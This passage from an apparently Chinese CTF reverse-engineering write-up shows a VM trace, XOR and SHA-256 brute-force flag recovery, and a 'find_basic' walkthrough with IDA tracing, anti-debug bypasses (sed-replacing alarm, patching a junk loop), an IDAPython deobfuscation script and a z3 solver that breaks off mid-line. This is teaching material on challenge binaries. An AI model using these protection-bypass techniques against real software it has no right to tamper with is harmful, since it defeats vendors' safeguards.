class="number">0x80415c</span>], <span class="number">0xa1</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">1158</span>] :: mov s2, &amp;s10</span><br><span class="line">[<span class="number">1160</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">1163</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1164</span>] :: mov s7, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1165</span>] :: mov s8, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1166</span>] :: mov s9, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1167</span>] :: mov s10, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1168</span>] :: mov s2, &amp;flag[<span class="number">30</span>]</span><br><span class="line">[<span class="number">1169</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">1170</span>] :: mov s2, &amp;flag[<span class="number">31</span>]</span><br><span class="line">[<span class="number">1171</span>] :: mov s7, s2</span><br><span class="line">[<span class="number">1172</span>] :: mov s8, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1173</span>] :: mov s2, &amp;s8</span><br><span class="line">[<span class="number">1174</span>] :: add s8, s8, s2</span><br><span class="line">[<span class="number">1177</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">1178</span>] :: add s8, s8, s2</span><br><span class="line">[<span class="number">1181</span>] :: mov s9, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1182</span>] :: mov s2, &amp;s9</span><br><span class="line">[<span class="number">1183</span>] :: add s9, s9, s2</span><br><span class="line">[<span class="number">1186</span>] :: mov s2, &amp;s7</span><br><span class="line">[<span class="number">1187</span>] :: add s9, s9, s2</span><br><span class="line">[<span class="number">1190</span>] :: mov s2, &amp;s9</span><br><span class="line">[<span class="number">1191</span>] :: add s10, s8, s2</span><br><span class="line">[<span class="number">1194</span>] :: exec r1194.r_address &lt;- <span class="number">8034255</span>c418000b1c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x80415c</span>], <span class="number">0xb1</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">1203</span>] :: mov s2, &amp;s10</span><br><span class="line">[<span class="number">1205</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">1208</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1209</span>] :: mov s7, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1210</span>] :: mov s8, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1211</span>] :: mov s9, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1212</span>] :: mov s10, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1213</span>] :: mov s2, &amp;flag[<span class="number">30</span>]</span><br><span class="line">[<span class="number">1214</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">1215</span>] :: mov s2, &amp;flag[<span class="number">31</span>]</span><br><span class="line">[<span class="number">1216</span>] :: mov s7, s2</span><br><span class="line">[<span class="number">1217</span>] :: mov s8, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1218</span>] :: mov s2, &amp;s8</span><br><span class="line">[<span class="number">1219</span>] :: add s8, s8, s2</span><br><span class="line">[<span class="number">1222</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">1223</span>] :: add s8, s8, s2</span><br><span class="line">[<span class="number">1226</span>] :: mov s2, &amp;s8</span><br><span class="line">[<span class="number">1227</span>] :: add s8, s8, s2</span><br><span class="line">[<span class="number">1230</span>] :: mov s9, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1231</span>] :: mov s2, &amp;s9</span><br><span class="line">[<span class="number">1232</span>] :: add s9, s9, s2</span><br><span class="line">[<span class="number">1235</span>] :: mov s2, &amp;s7</span><br><span class="line">[<span class="number">1236</span>] :: add s9, s9, s2</span><br><span class="line">[<span class="number">1239</span>] :: mov s2, &amp;s9</span><br><span class="line">[<span class="number">1240</span>] :: add s10, s8, s2</span><br><span class="line">[<span class="number">1243</span>] :: exec r1243.r_address &lt;- <span class="number">8034255</span>c418000e5c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x80415c</span>], <span class="number">0xe5</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">1252</span>] :: mov s2, &amp;s10</span><br><span class="line">[<span class="number">1254</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">1257</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1258</span>] :: mov s7, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1259</span>] :: mov s8, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1260</span>] :: mov s9, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1261</span>] :: mov s10, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1262</span>] :: mov s2, &amp;s5</span><br><span class="line">[<span class="number">1264</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) <span class="built_in">fail</span>(),</span><br></pre></td></tr></table></figure><p>大致思路是对输入异或然后+i对比数据</p><p>但是flag数组前四个没直接给出，有四个大数字以第一个为例1585408084625667200</p><p>转为16进制16008040cc253480 倒叙一下就是 803425cc40800016，再根据后面的数据类推，flag[0]就是0x16</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">xor=[<span class="number">0x16</span>,<span class="number">0x17</span>,<span class="number">0x10</span>,<span class="number">0x12</span>,<span class="number">0x10</span>,<span class="number">0x11</span>,<span class="number">0x12</span>,<span class="number">0x13</span>,<span class="number">0x14</span>,<span class="number">0x15</span>,<span class="number">0x16</span>,<span class="number">0x17</span>,<span class="number">0x18</span>,<span class="number">0x19</span>,<span class="number">0x24</span>,<span class="number">0x2c</span>,<span class="number">0x26</span>,<span class="number">0x1e</span>,<span class="number">0x1f</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x21</span>,<span class="number">0x23</span>,<span class="number">0x27</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x27</span>]</span><br><span class="line">encflag=[<span class="number">0x70</span>,<span class="number">0x7c</span>,<span class="number">0x73</span>,<span class="number">0x78</span>,<span class="number">0x6f</span>,<span class="number">0x27</span>,<span class="number">0x2a</span>,<span class="number">0x2c</span>,<span class="number">0x7f</span>,<span class="number">0x35</span>,<span class="number">0x2d</span>,<span class="number">0x32</span>,<span class="number">0x37</span>,<span class="number">0x3b</span>,<span class="number">0x22</span>,<span class="number">0x59</span>,<span class="number">0x53</span>,<span class="number">0x8e</span>,<span class="number">0x3d</span>,<span class="number">0x2a</span>,<span class="number">0x59</span>,<span class="number">0x27</span>,<span class="number">0x2d</span>,<span class="number">0x29</span>,<span class="number">0x34</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x32</span>]</span><br><span class="line">a=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encflag)):</span><br><span class="line">   a+=<span class="built_in">chr</span>((encflag[i]-i)^xor[i])</span><br><span class="line">l = <span class="string">&quot;1234567890abcdef&quot;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> l:</span><br><span class="line"> <span class="keyword">for</span> c <span class="keyword">in</span> l:</span><br><span class="line">  <span class="keyword">for</span> d <span class="keyword">in</span> l:</span><br><span class="line">    flag = a+b+c+d+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    sha = hashlib.sha256(flag.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> sha[<span class="number">0</span>:<span class="number">16</span>] == <span class="string">&quot;f860464d767610bb&quot;</span>:</span><br><span class="line">     <span class="built_in">print</span>(flag)</span><br><span class="line">     <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后的flag：flag{366c950370fec47e34581a0574}</p></div><div class="story post-story"><h2 id="find-basic"><a href="#find-basic" class="headerlink" title="find_basic"></a>find_basic</h2><p>IDA 静态分析，可以明显看出程序加过 VM 且每个 handler 自身作为分发器</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208032148362.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208032148362.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>call进入的后是switch语句，再根据之前的赋值执行相应的操作</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208032152064.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208032152064.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">大概混肴逻辑是先赋值一个数，这个数决定了下面函数的操作，进入下面的call函数，执行相应的语句</p><h3 id="trace记录"><a href="#trace记录" class="headerlink" title="trace记录"></a>trace记录</h3><p>debugger打开tracing window</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208052105362.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208052105362.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt=" "></p><p>在的打开view里面的tracing</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208052108097.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208052108097.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>然后点亮代码跟踪</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208052112190.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208052112190.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>但是在调试时候会有如下报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F7CF3464: got SIGTRAP signal (Trace trap) (exc.code 5, tid 8259)</span><br></pre></td></tr></table></figure><p>正常调试是没用问题的，启用trace之后就会报错，这里设置一下ida调试debugger option</p><p>选择最下方edit exceptions</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208061013405.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208061013405.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>其他类似的报错也可如此，但是究其原理，类似是创造了一个死循环，有师傅懂得的话欢迎评论</p><p>参考：</p><p><a href="http://nigoule.com/?p=514">常见反调试整理 (nigoule.com)</a></p><p><a href="https://blog.csdn.net/halfclear/article/details/72783900">Linux进程被信号杀死后退出状态码(exit code)的分析_halfclear的博客-CSDN博客_exitcode</a></p><p>例如移除时钟报错，有一种思路就是更换函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">移除alarm函数</span><br><span class="line"># 将程序名为ProgrammName中的alarm替换为isnan &gt;</span><br><span class="line"></span><br><span class="line">sed -i s/alarm/isnan/g ./ProgrammName</span><br></pre></td></tr></table></figure><p>为了方便查看trace代码，这里还有一个垃圾循环我们可以修改一下</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208061020672.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208061020672.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>主要逻辑是产生了一个随机数后逻辑与0xFF，不断地比较。如果小于就自增一在继续判断，不断地循环直到和产生的随机数相等再推出循环。经过分析该循环体内没有需要的数据。我们可以直接patch跳转条件</p><p>或者在call完rand函数之后下一个不执行但是修改eax值的断点</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208061022568.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208061022568.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>然后我们就可以下断点trcace我们的代码</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208061025499.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208061025499.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>接着就可以分析相关的执行数据</p><p>例如这里就是我们的数据</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208061040691.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208061040691.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>以下类推可以得到最终的逻辑</p><p>或者我们可以写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_32)</span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mydis</span>(<span class="params">code, addr=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(code, addr): </span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&#x27;%s %s&#x27;</span> %(i.mnemonic, i.op_str))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myasm</span>(<span class="params">dis_txt, addr=<span class="number">0</span></span>):</span><br><span class="line">    <span class="comment">#keystone fail</span></span><br><span class="line">    encoding, count = ks.asm(dis_txt, addr=addr)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(encoding)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, start_ea, end_ea, imm, reg, call_target</span>):</span><br><span class="line">        self.start_ea = start_ea</span><br><span class="line">        self.end_ea = end_ea</span><br><span class="line">        self.imm = imm</span><br><span class="line">        self.reg = reg</span><br><span class="line">        self.call_target = call_target</span><br><span class="line"></span><br><span class="line">regnums = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_block</span>(<span class="params">start_ea</span>):</span><br><span class="line">    mnem_list = [<span class="string">&#x27;pushf&#x27;</span>, <span class="string">&#x27;pusha&#x27;</span>, <span class="string">&#x27;mov&#x27;</span>, <span class="string">&#x27;call&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>]</span><br><span class="line">    ea = start_ea</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">5</span>:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem_list[i%<span class="number">5</span>] != mnem:</span><br><span class="line">            <span class="keyword">raise</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;mov&#x27;</span>:</span><br><span class="line">            imm = idc.get_operand_value(ea, <span class="number">1</span>)</span><br><span class="line">            <span class="comment"># 17 -&gt; cl, 18 -&gt; dl, 19 -&gt; bl</span></span><br><span class="line">            reg = idc.get_operand_value(ea, <span class="number">0</span>) <span class="comment">#reg_id</span></span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            if reg not in regnums:</span></span><br><span class="line"><span class="string">                print (&#x27;reg=%s, ea=%x&#x27; %(reg, ea))</span></span><br><span class="line"><span class="string">                regnums.append(reg)</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;call&#x27;</span>:</span><br><span class="line">            call_target = idc.get_operand_value(ea, <span class="number">0</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        ea += idc.get_item_size(ea)</span><br><span class="line">    <span class="keyword">return</span> Block(start_ea, ea, imm, reg, call_target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_mnem</span>(<span class="params">ea, should_mnem</span>):</span><br><span class="line">    mnem = idc.print_insn_mnem(ea)</span><br><span class="line">    <span class="keyword">if</span> mnem != should_mnem:</span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_real_code</span>(<span class="params">block, new_code, new_code_ea</span>):</span><br><span class="line">    ea = block.call_target</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;cmp&#x27;</span>:</span><br><span class="line">            reg = idc.get_operand_value(ea, <span class="number">0</span>)</span><br><span class="line">            imm = idc.get_operand_value(ea, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> (reg == block.reg) &amp; (imm == block.imm):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        ea += idc.get_item_size(ea)</span><br><span class="line"></span><br><span class="line">    ea += idc.get_item_size(ea)</span><br><span class="line"></span><br><span class="line">    check_mnem(ea, <span class="string">&#x27;jnz&#x27;</span>)</span><br><span class="line">    ea += idc.get_item_size(ea)</span><br><span class="line"></span><br><span class="line">    check_mnem(ea, <span class="string">&#x27;popa&#x27;</span>)</span><br><span class="line">    ea += idc.get_item_size(ea)</span><br><span class="line"></span><br><span class="line">    check_mnem(ea, <span class="string">&#x27;popf&#x27;</span>)</span><br><span class="line">    ea += idc.get_item_size(ea)</span><br><span class="line"></span><br><span class="line">    mnem = idc.print_insn_mnem(ea)</span><br><span class="line">    <span class="keyword">if</span> mnem == <span class="string">&#x27;pushf&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;find ret: ea=%x&#x27;</span> %ea)</span><br><span class="line">        new_code += myasm(<span class="string">&#x27;ret&#x27;</span>, new_code_ea+<span class="built_in">len</span>(new_code))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, new_code</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;jmp&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        dis = mydis(idc.get_bytes(ea, idc.get_item_size(ea)), ea)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;block=%x, ea=%x, dis=%s&#x27;</span> %(block.start_ea, ea, dis))</span><br><span class="line">        new_code += myasm(dis, new_code_ea+<span class="built_in">len</span>(new_code))</span><br><span class="line">        ea += idc.get_item_size(ea)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>, new_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_one_fun</span>(<span class="params">fun_start, new_code_ea</span>):</span><br><span class="line">    ea = fun_start</span><br><span class="line">    new_code = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem != <span class="string">&#x27;pushf&#x27;</span>:</span><br><span class="line">            dis = mydis(idc.get_bytes(ea, idc.get_item_size(ea)), ea)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ea=%x, dis=%s&#x27;</span> % (ea, dis))</span><br><span class="line">            new_code += myasm(dis, new_code_ea + <span class="built_in">len</span>(new_code))</span><br><span class="line">            <span class="keyword">if</span> mnem == <span class="string">&#x27;retn&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ea += idc.get_item_size(ea)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;get_block ea=%x&#x27;</span> %ea)</span><br><span class="line">            myblock = get_block(ea)</span><br><span class="line">            <span class="comment">#print (&#x27;ea=%x, new_ea=%x&#x27; %(myblock.start_ea, new_code_ea+len(new_code)))</span></span><br><span class="line">            ret, new_code = get_real_code(myblock, new_code, new_code_ea)</span><br><span class="line">            <span class="keyword">if</span> ret:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ea = myblock.end_ea</span><br><span class="line">    <span class="keyword">return</span> new_code</span><br><span class="line"></span><br><span class="line">new_code_start = <span class="number">0x96150</span></span><br><span class="line">ida_bytes.patch_bytes(new_code_start, <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10000</span>):</span><br><span class="line">    idc.del_items(i+new_code_start)</span><br><span class="line"></span><br><span class="line">funs = [<span class="number">0x48F4</span>, <span class="number">0x48c8</span>, <span class="number">0x3fbf</span>, <span class="number">0x3F1B</span>, <span class="number">0x4148</span>, <span class="number">0x750A9</span>, <span class="number">0x33EC</span>]</span><br><span class="line">new_code_ea = new_code_start</span><br><span class="line"><span class="keyword">for</span> fun <span class="keyword">in</span> funs:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;--------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;fun=%x, new_fun=%x&#x27;</span> %(fun, new_code_ea))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;--------------------------------&#x27;</span>)</span><br><span class="line">    new_code = handle_one_fun(fun, new_code_ea)</span><br><span class="line">    ida_bytes.patch_bytes(new_code_ea, new_code)</span><br><span class="line">    idc.create_insn(new_code_ea)</span><br><span class="line">    ida_funcs.add_func(new_code_ea)</span><br><span class="line">    new_code_ea += <span class="built_in">len</span>(new_code)</span><br></pre></td></tr></table></figure><p>最后z3求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">v5 = <span class="number">40085</span> * flag[<span class="number">3</span>]- <span class="number">222506</span> * flag[<span class="number">2</span>]+ <span class="number">54507</span> * flag[<span class="number">4</span>]+ <span class="number">88056</span> * flag[<span class="number">1</span>]+ <span class="number">212571</span> * flag[<span class="number">5</span>]- <span class="number">160722</span> * flag[<span class="number">0</span>]-<span class="number">0x6A31D</span></span><br><span class="line">s.add(v5==<span class="number">0</span>)</span><br><span class="line">v5 = <span class="number">49300</span> * flag[<span class="number">3</span>]+ <span class="number">259229</span> * flag[<span class="number">0</span>]+ <span class="number">278066</span> * flag[<span class="number">2</span>]- <span class="number">127937</span> * flag[<span class="number">1</span>]- <span class="number">295169</span> * flag[<span class="number">4</span>]- <span class="number">8368677</span></span><br><span class="line">s.add(v5==<span class="number">0</span>)</span><br><span class="line">v5 = <span class="number">42214</span> * flag[<span class="number">1</span>]- <span class="number">108025</span> * flag[<span class="number">3</span>]+ <span class="number">205972</span> * flag[<span class="number">0</span>]+ <span class="number">27559</span> * flag[<span class="number">2</span>]- <span class="number">17114904</span></span><br><span 